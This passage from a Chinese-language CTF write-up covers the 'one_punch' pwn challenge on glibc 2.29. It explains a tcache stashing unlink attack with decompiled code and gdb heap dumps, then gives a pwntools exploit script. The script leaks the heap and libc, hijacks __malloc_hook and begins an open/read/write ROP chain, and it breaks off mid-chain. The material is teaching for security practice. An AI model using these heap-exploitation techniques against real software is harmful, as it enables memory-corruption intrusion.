    <span class="n">error</span><span class="p">(</span><span class="s">&quot;invalid&quot;</span><span class="p">,</span> <span class="n">a2</span><span class="p">);</span>
  <span class="n">free</span><span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="kt">void</span> <span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">unk_4040</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">v2</span><span class="p">));</span>
<span class="p">}</span>
</code></pre></div>
后门函数可以调用 <code>malloc</code> 分配 <code>0x217</code> 大小的堆块，但是要要满足 <code>*(_BYTE *)(qword_4030 + 0x20) &gt; 6</code> ，我们在 <code>main</code> 函数里可以看到这里被初始化为 <code>heap_base+0x10</code> ，对于 glibc 2.29，这个位置对应存储的是 <code>tcache_perthread_struct</code> 的 <code>0x220</code> 大小的 <code>tcache_bin</code> 的数量，正常来说，如果我们想调用后门的功能，要让这个 <code>count</code> 为 7 ，然而这也就意味着 <code>0x217</code> 再分配和释放都同 <code>glibc 2.23</code> 一样，我们无法通过 <code>UAF</code> 改 chunk 的 <code>fd</code> 来达到任意地址写的目的，因此我们要通过别的方式修改这个值。
<div class="highlight"><pre><span></span><code><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="n">Magic</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a2</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]</span>

  <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">qword_4030</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">6</span> <span class="p">)</span>
    <span class="n">error</span><span class="p">(</span><span class="s">&quot;gg&quot;</span><span class="p">,</span> <span class="n">a2</span><span class="p">);</span>
  <span class="n">buf</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x217uLL</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">buf</span> <span class="p">)</span>
    <span class="n">error</span><span class="p">(</span><span class="s">&quot;err&quot;</span><span class="p">,</span> <span class="n">a2</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x217uLL</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="p">)</span>
    <span class="n">error</span><span class="p">(</span><span class="s">&quot;io&quot;</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Serious Punch!!!&quot;</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="o">&amp;</span><span class="n">unk_2128</span><span class="p">);</span>
  <span class="k">return</span> <span class="nf">puts</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>
Edit 和 Show 函数分别可以对堆块内容进行编辑和输出。</p>
<h5 id="_13">利用思路<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h5>
<p>由于 glibc 2.29 中新增了对于 <code>unsorted bin</code> 链表完整性检查，这使得 <code>unsorted bin attack</code> 完全失效，我们的目标是往一个地址中写入 <code>large value</code> ，这种情况下就可以选择 <code>tcache stashing unlink attack</code>。</p>
<p>首先我们可以通过UAF来泄露 <code>heap</code> 和 <code>libc</code> 地址。具体方式是分配并释放多个chunk使其进入 <code>tcache</code> ，通过 <code>Show</code> 函数可以输出 <code>tcache bin</code> 的 <code>fd</code> 值来泄露堆地址。释放某个 <code>small bin size</code> 范围内的chunk七个，在第八次释放时会先把释放的堆块放入 <code>unsorted bin</code> 。通过 <code>Show</code> 函数可以泄露出 libc 地址。</p>
<p>我们首先通过 <code>UAF</code> 将 <code>__malloc_hook</code> 链入 <code>tcache</code> 备用。然后分配并释放六次 <code>0x100</code> 大小的chunk进入 <code>tcache</code> 。通过 <code>unsorted bin</code> 切割得到 <code>last remainer</code> 的方式得到两个大小为 <code>0x100</code> 的chunk。再分配一个超过 0x100 的块使其进入 <code>small bin</code> 。按照释放顺序我们称之为 bin1 和 bin2 。修改 <code>bin2-&gt;bk</code> 为 <code>(heap_base+0x2f)-0x10</code> ，调用 <code>calloc(0xf0)</code> 触发 <code>small bin</code> 放入 <code>tcache</code> 的处理逻辑，由于 <code>tcache</code> 中有 6 个块，因此循环处理只会进行一次，这样也避免了 fake_chunk 因 bk 处无可写地址作为下一个块进行 unlink 时 <code>bck-&gt;fd=bin</code> 带来的内存访问错误。最终改掉 <code>heap_base+0x30</code> 的值绕过检查。</p>
<h5 id="_14">利用步骤<a class="headerlink" href="#_14" title="Permanent link">&para;</a></h5>
<p>下面在调用 calloc 前下断点，可以看到此时 <code>tcache[0x100]</code> 有 6 个堆块，small bin 的分配顺序为 <code>0x000055555555c460-&gt;0x55555555cc80-&gt;0x000055555555901f</code> ，在 <code>calloc(0xf0)</code> 调用后， <code>0x000055555555c460</code> 会被返回给用户， <code>0x55555555cc80</code> 被链入tcache，而由于没有多余位置，跳出循环， <code>0x000055555555901f</code> 不做处理。</p>
<p><div class="highlight"><pre><span></span><code>gdb-peda$ heapinfo
<span class="o">(</span>0x20<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">0</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x30<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">1</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x40<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">2</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x50<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">3</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x60<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">4</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x70<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">5</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x80<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">6</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x90<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">7</span><span class="o">]</span>: 0x0
<span class="o">(</span>0xa0<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">8</span><span class="o">]</span>: 0x0
<span class="o">(</span>0xb0<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">9</span><span class="o">]</span>: 0x0
                  top: 0x55555555d9d0 <span class="o">(</span>size : 0x1c630<span class="o">)</span> 
       last_remainder: 0x55555555cc80 <span class="o">(</span>size : 0x100<span class="o">)</span> 
            unsortbin: 0x0
<span class="o">(</span>0x030<span class="o">)</span>  smallbin<span class="o">[</span> <span class="m">1</span><span class="o">]</span>: 0x555555559ba0
<span class="o">(</span>0x100<span class="o">)</span>  smallbin<span class="o">[</span><span class="m">14</span><span class="o">]</span>: 0x55555555cc80 <span class="o">(</span>doubly linked list corruption 0x55555555cc80 !<span class="o">=</span> 0x100 and 0x55555555cc80 is broken<span class="o">)</span>          
<span class="o">(</span>0x100<span class="o">)</span>   tcache_entry<span class="o">[</span><span class="m">14</span><span class="o">](</span><span class="m">6</span><span class="o">)</span>: 0x55555555a3f0 --&gt; 0x55555555a2f0 --&gt; 0x55555555a1f0 --&gt; 0x55555555a0f0 --&gt; 0x555555559ff0 --&gt; 0x555555559ab0
<span class="o">(</span>0x130<span class="o">)</span>   tcache_entry<span class="o">[</span><span class="m">17</span><span class="o">](</span><span class="m">7</span><span class="o">)</span>: 0x555555559980 --&gt; 0x555555559850 --&gt; 0x555555559720 --&gt; 0x5555555595f0 --&gt; 0x5555555594c0 --&gt; 0x555555559390 --&gt; 0x555555559260
<span class="o">(</span>0x220<span class="o">)</span>   tcache_entry<span class="o">[</span><span class="m">32</span><span class="o">](</span><span class="m">1</span><span class="o">)</span>: 0x55555555d7c0 --&gt; 0x7ffff7fb4c30
<span class="o">(</span>0x410<span class="o">)</span>   tcache_entry<span class="o">[</span><span class="m">63</span><span class="o">](</span><span class="m">7</span><span class="o">)</span>: 0x55555555bd50 --&gt; 0x55555555b940 --&gt; 0x55555555b530 --&gt; 0x55555555b120 --&gt; 0x55555555ad10 --&gt; 0x55555555a900 --&gt; 0x55555555a4f0
gdb-peda$ x/4gx 0x55555555cc80
0x55555555cc80: 0x0000000000000000      0x0000000000000101
0x55555555cc90: 0x000055555555c460      0x000055555555901f
gdb-peda$ x/4gx 0x000055555555c460
0x55555555c460: 0x0000000000000000      0x0000000000000101
0x55555555c470: 0x00007ffff7fb4d90      0x000055555555cc80
gdb-peda$ x/4gx 0x00007ffff7fb4d90
0x7ffff7fb4d90 &lt;main_arena+336&gt;:        0x00007ffff7fb4d80      0x00007ffff7fb4d80                                                  
0x7ffff7fb4da0 &lt;main_arena+352&gt;:        0x000055555555cc80      0x000055555555c460
</code></pre></div>
calloc 分配完成之后的结果和我们预期一致， <code>0x000055555555901f</code> 作为 <code>fake_chunk</code> 其 <code>fd</code> 也被改写为了 <code>libc</code> 地址
<div class="highlight"><pre><span></span><code>gdb-peda$ heapinfo
<span class="o">(</span>0x20<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">0</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x30<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">1</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x40<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">2</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x50<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">3</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x60<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">4</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x70<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">5</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x80<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">6</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x90<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">7</span><span class="o">]</span>: 0x0
<span class="o">(</span>0xa0<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">8</span><span class="o">]</span>: 0x0
<span class="o">(</span>0xb0<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">9</span><span class="o">]</span>: 0x0
                  top: 0x55555555d9d0 <span class="o">(</span>size : 0x1c630<span class="o">)</span> 
       last_remainder: 0x55555555cc80 <span class="o">(</span>size : 0x100<span class="o">)</span> 
            unsortbin: 0x0
<span class="o">(</span>0x030<span class="o">)</span>  smallbin<span class="o">[</span> <span class="m">1</span><span class="o">]</span>: 0x555555559ba0
<span class="o">(</span>0x100<span class="o">)</span>  smallbin<span class="o">[</span><span class="m">14</span><span class="o">]</span>: 0x55555555cc80 <span class="o">(</span>doubly linked list corruption 0x55555555cc80 !<span class="o">=</span> 0x700 and 0x55555555cc80 is broken<span class="o">)</span>          
<span class="o">(</span>0x100<span class="o">)</span>   tcache_entry<span class="o">[</span><span class="m">14</span><span class="o">](</span><span class="m">7</span><span class="o">)</span>: 0x55555555cc90 --&gt; 0x55555555a3f0 --&gt; 0x55555555a2f0 --&gt; 0x55555555a1f0 --&gt; 0x55555555a0f0 --&gt; 0x555555559ff0 --&gt; 0x555555559ab0
<span class="o">(</span>0x130<span class="o">)</span>   tcache_entry<span class="o">[</span><span class="m">17</span><span class="o">](</span><span class="m">7</span><span class="o">)</span>: 0x555555559980 --&gt; 0x555555559850 --&gt; 0x555555559720 --&gt; 0x5555555595f0 --&gt; 0x5555555594c0 --&gt; 0x555555559390 --&gt; 0x555555559260
<span class="o">(</span>0x210<span class="o">)</span>   tcache_entry<span class="o">[</span><span class="m">31</span><span class="o">](</span><span class="m">144</span><span class="o">)</span>: <span class="m">0</span>
<span class="o">(</span>0x220<span class="o">)</span>   tcache_entry<span class="o">[</span><span class="m">32</span><span class="o">](</span><span class="m">77</span><span class="o">)</span>: 0x55555555d7c0 --&gt; 0x7ffff7fb4c30
<span class="o">(</span>0x230<span class="o">)</span>   tcache_entry<span class="o">[</span><span class="m">33</span><span class="o">](</span><span class="m">251</span><span class="o">)</span>: <span class="m">0</span>
<span class="o">(</span>0x240<span class="o">)</span>   tcache_entry<span class="o">[</span><span class="m">34</span><span class="o">](</span><span class="m">247</span><span class="o">)</span>: <span class="m">0</span>
<span class="o">(</span>0x250<span class="o">)</span>   tcache_entry<span class="o">[</span><span class="m">35</span><span class="o">](</span><span class="m">255</span><span class="o">)</span>: <span class="m">0</span>
<span class="o">(</span>0x260<span class="o">)</span>   tcache_entry<span class="o">[</span><span class="m">36</span><span class="o">](</span><span class="m">127</span><span class="o">)</span>: <span class="m">0</span>
<span class="o">(</span>0x410<span class="o">)</span>   tcache_entry<span class="o">[</span><span class="m">63</span><span class="o">](</span><span class="m">7</span><span class="o">)</span>: 0x55555555bd50 --&gt; 0x55555555b940 --&gt; 0x55555555b530 --&gt; 0x55555555b120 --&gt; 0x55555555ad10 --&gt; 0x55555555a900 --&gt; 0x55555555a4f0
gdb-peda$ x/4gx 0x000055555555901f+0x10
0x55555555902f: 0x00007ffff7fb4d90      0x0000000000000000
0x55555555903f: 0x0000000000000000      0x0000000000000000
</code></pre></div>
由于沙箱保护，我们无法执行 <code>execve</code> 函数调用，只能通过 <code>open/read/write</code> 来读取 flag 。我们选择通过调用后门函数修改 <code>__malloc_hook</code> 为 <code>gadget(mov eax, esi ; add rsp, 0x48 ; ret)</code> ，以便 add 的时候将 <code>rsp</code> 改到可控的输入区域调用 <code>rop chains</code> 来 <code>orw</code> 读取 <code>flag</code> 。</p>
<p>完整 exp 如下：</p>
<div class="highlight"><pre><span></span><code><span class="c1">#coding=utf-8</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">context</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;DEBUG&#39;</span><span class="p">)</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;tmux&#39;</span><span class="p">,</span><span class="s1">&#39;split&#39;</span><span class="p">,</span><span class="s1">&#39;-h&#39;</span><span class="p">]</span>
<span class="n">debug</span> <span class="o">=</span> <span class="mi">1</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./one_punch&#39;</span><span class="p">)</span>
<span class="n">libc_offset</span> <span class="o">=</span> <span class="mh">0x3c4b20</span>
<span class="n">gadgets</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x45216</span><span class="p">,</span><span class="mh">0x4526a</span><span class="p">,</span><span class="mh">0xf02a4</span><span class="p">,</span><span class="mh">0xf1147</span><span class="p">]</span>
<span class="k">if</span> <span class="n">debug</span><span class="p">:</span>
    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span><span class="p">)</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./one_punch&#39;</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">Add</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">name</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;&gt; &#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;idx: &quot;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;hero name: &quot;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">Edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">name</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;&gt; &#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;idx: &quot;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;hero name: &quot;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">Show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;&gt; &#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;idx: &quot;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">Delete</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;&gt; &#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;idx: &quot;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">BackDoor</span><span class="p">(</span><span class="n">buf</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;&gt; &#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;50056&#39;</span><span class="p">)</span>
    <span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">exp</span><span class="p">():</span>
    <span class="c1">#leak heap</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
        <span class="n">Add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x120</span><span class="p">)</span>
        <span class="n">Delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">Show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;hero name: &quot;</span><span class="p">)</span>
    <span class="n">heap_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x850</span>
    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&quot;[+]heap base =&gt; &quot;</span><span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">heap_base</span><span class="p">))</span>
    <span class="c1">#leak libc</span>
    <span class="n">Add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x120</span><span class="p">)</span>
    <span class="n">Add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x400</span><span class="p">)</span>
    <span class="n">Delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">Show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;hero name: &quot;</span><span class="p">)</span>
    <span class="n">libc_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span> <span class="o">-</span> <span class="p">(</span><span class="mh">0x902ca0</span><span class="o">-</span><span class="mh">0x71e000</span><span class="p">)</span>
    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&quot;[+]libc base =&gt; &quot;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
    <span class="c1">#</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
        <span class="n">Add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0xf0</span><span class="p">)</span>
        <span class="n">Delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
        <span class="n">Add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x400</span><span class="p">)</span>
        <span class="n">Delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">Add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x400</span><span class="p">)</span>
    <span class="n">Add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x400</span><span class="p">)</span>
    <span class="n">Add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x400</span><span class="p">)</span>
    <span class="n">Add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x400</span><span class="p">)</span>
    <span class="n">Delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="c1">#UAF</span>
    <span class="n">Add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x300</span><span class="p">)</span>
    <span class="n">Add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x300</span><span class="p">)</span>
    <span class="c1">#agagin</span>
    <span class="n">Delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="c1">#UAF</span>
    <span class="n">Add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x300</span><span class="p">)</span>
    <span class="n">Add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x300</span><span class="p">)</span>
    <span class="n">Edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="s1">&#39;./flag&#39;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
    <span class="n">Edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x300</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x101</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="p">(</span><span class="mh">0x000055555555c460</span><span class="o">-</span><span class="mh">0x555555559000</span><span class="p">))</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x1f</span><span class="p">))</span>

    <span class="c1">#trigger</span>
    <span class="n">Add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x217</span><span class="p">)</span>

    <span class="n">Delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">Edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;__malloc_hook&#39;</span><span class="p">]))</span>
    <span class="c1">#gdb.attach(p,&#39;b calloc&#39;)</span>
    <span class="n">Add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0xf0</span><span class="p">)</span>

    <span class="n">BackDoor</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
    <span class="c1">#mov eax, esi ; add rsp, 0x48 ; ret</span>
    <span class="c1">#magic_gadget = libc_base + libc.sym[&#39;setcontext&#39;]+53</span>
    <span class="c1"># add rsp, 0x48 ; ret</span>
    <span class="n">magic_gadget</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x000000000008cfd6</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">magic_gadget</span><span class="p">)</span>

    <span class="n">BackDoor</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

    <span class="n">p_rdi</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x0000000000026542</span>
    <span class="n">p_rsi</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x0000000000026f9e</span>
    <span class="n">p_rdx</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x000000000012bda6</span>
    <span class="n">p_rax</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x0000000000047cf8</span>
    <span class="n">syscall</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x00000000000cf6c5</span>
    <span class="n">rop_heap</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x44b0</span>

    <span class="n">rops</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">p_rdi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">rop_heap</span><span class="p">)</span>
    <span class="n">rops</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">p_rsi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">rops</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">p_rdx</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">rops</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">p_rax</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">rops</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span>
    <span class="c1">#rops += p64(libc.sym[&#39;open&#39;])</span>
    <span class="c1">#read</span>
